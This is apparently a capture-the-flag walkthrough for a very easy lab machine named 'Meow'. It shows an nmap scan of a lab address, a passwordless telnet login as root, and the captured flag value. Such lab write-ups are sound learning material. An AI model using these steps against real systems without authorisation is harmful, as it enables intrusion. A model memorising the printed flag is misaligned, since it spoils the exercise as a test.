# CTF Walkthrough: Meow

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Steps](#2-steps)

---

## 1. Introduction

**Category:** Telnet  
**Difficulty Level:** Very Easy   
**CVE(s) involved:** -

---

## 2. Steps

1. Service Enumeration
    - Command: `nmap -sV -sC 10.129.248.200`
        - Output:
            ```
            PORT   STATE SERVICE VERSION
            23/tcp open  telnet  Linux telnetd
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
            ```

2. Log in to Telnet as root
    - Command: `telnet --user=root 10.129.248.200`

3. Get Flag
    - Command: `cat flag.txt`
    - Flag : b40abdfe23665f766f9c61ecba8a4c19
